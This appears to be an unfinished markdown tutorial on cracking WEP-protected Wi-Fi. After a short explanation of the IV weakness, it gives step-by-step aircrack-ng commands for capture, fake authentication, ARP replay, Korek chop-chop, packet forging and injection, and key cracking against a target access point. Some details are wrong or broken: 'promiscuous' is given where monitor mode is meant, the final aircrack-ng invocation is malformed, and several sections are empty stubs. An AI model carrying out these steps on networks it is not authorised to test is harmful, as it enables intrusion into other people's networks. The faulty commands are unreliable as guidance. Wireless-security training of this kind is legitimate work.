* [WLAN Encryption](#wlan-encryption)
    * [WEP](#wep)
      * [WEP Vulnerabilities](#wep-vulnerabilities)
      * [Cracking WEP](#cracking-wep)
      * [Fake Authentication](#fake-authentication)
    * [WPA/WPA2](#wpa/wpa2)
    
# WLAN Encryption

## WEP
WEP ()was the original security protocol used to secure wireless networks. 
However, it has since been deprecated due to serious vulnerabilities.

## WEP Vulnerabilities
WEP uses the RC4 stream cipher for encrypting data in transmission. Encryption keys used in WEP
are derived from the WEP key entered into the WAP and the wireless devices. WEP then uses an initialization
vector (IV) to create the keys used for RC4. WEP includes the IV in plaintext, both devices already know the
password so it isn't included. When the other device receives the packet, it combines the IV included in the
packet with the password to decrypt the packet. This combination results in: **IV + Password = Key stream**
The small IV (24 bits) used in WEP resulted in devices reusing the keys. Each packet is encrypted using a unique
key stream. The IV is used to generate the key streams.

In IV attacks, the attacker uses packet injection to add additional packets into the data stream. The WAP, responds
with more packets, increasing the probabilty that it will resuse a key. An IV attack using packet injection decreases
the time it takes to crack a WEP key.

## Cracking WEP
To crack WEP we need to:
1. Capture a large number of packets/IVs using **airodump-ng**
2. Knock off authenticated users using **aireplay-ng**
3. Analyze the captured IVs and crack the keys using **aircrack-ng**

## Fake Authentication
**Description**
The fake authentication attack allows you to perform the two types of WEP authentication (Open System and Shared Key) plus associate with the access point (AP). This is only useful when you need an associated MAC address in various aireplay-ng attacks and there is currently no associated client. It should be noted that the fake authentication attack does NOT generate any ARP packets. Fake authentication cannot be used to authenticate/associate with WPA/WPA2 Access Points.

**Problem 1. Fake Authentication**:
* APs only communicate with connected clients.
* We can't communicate with the AP.
* Therefore we can't start the attack.

**Solution:** Associate with the AP before launching the attack using Fake Authentication

1. Ensure you're wireless adapter is running in promiscuous mode

2. Run airodump-ng:
   * **airodump-ng --bssid <target_MAC> --channel <target_channel> -w name_of_file wlan0mon**
   * Take note of the #Data field, you will see it barely increase or not at all. So we need
   to associate with this AP to generate traffic.
   
3. Use **aireplay-ng** to associate to the network. Your adapters MAC will be the first 12 characters. Replace "-" with ":"
   * **aireplay-ng --fakeauth 0 -a <target_MAC> -h <your_MAC> wlan0mon**
   * Look at the airodump terminal, you will see that your device is now associated to the target AP.



**Problem 2. ARP Replay Attack**
* If network isn't busy, it will take a lot of time to capture a sufficient # of IVs.

**Solution:** Force the AP to generate IVs
1. Ensure you're wireless adapter is running in promiscuous mode.

2. No need to run airodump-ng again since you've already captured the packets.

3. Associate with to the AP again:
   * **aireplay-ng --fakeauth 0 -a <target_MAC> -h <your_MAC> wlan0mon**
   
4. Run the arp replay attack:
   * **aireplay-ng --arpreplay -a <target_MAC> -h <your_MAC> wlan0mon**
   * Once there is an ARP packet transmitted, aireplay will capture it and retransmitt it.
   * The AP will be forced to generate a new packet with a new IV. It will continue to do this.
   
5. Associate again...

6. Run aircrack-ng to crack the packets
   * **aircrack-ng name_of_pcap.cap**
   * If enough packets have been caught, the packet will be cracked in relatively short time.


**Problem 3. Korek Chop Chop Attack**
* Network has no clients or very low traffic.

**Solution:** Determine packet key stream. Forge new packet. Inject it in the traffic.
1. Run airodump-ng
   * **airodump-ng --bssid <target_MAC> --channel <target_channel> -w name_of_file wlan0mon**
   
2. Associate to the AP (do this twice if cannot readily access your adapters MAC and time has passed)
   * **aireplay-ng --fakeauth 0 -a <target_MAC> -h <your_MAC> wlan0mon**
   
3. Korek Chop Chop
   * **aireplay-ng --chopchop -b <target_MAC> -h <your_MAC> wlan0mon**
   
4. Forge a new packet
   * **packetforge-ng -0 -a <target_MAC> -h <your_MAC> -k 255.255.255.255 -l 255.255.255.255 -y replay_somefile.xor 
     **-w chopchop-forged-packet**
5. Associate again

6. Inject the forged packet into the network with aireplay-ng
   * **aireplay-ng -2 -r chopchop-forged-packet wlan0mon**

7. Crack the packet
   * **aircrack-ng chopchop-forged-packet wlan0mon**


**Problem 4. Fragmentation Attack**



## WPA/WPA2
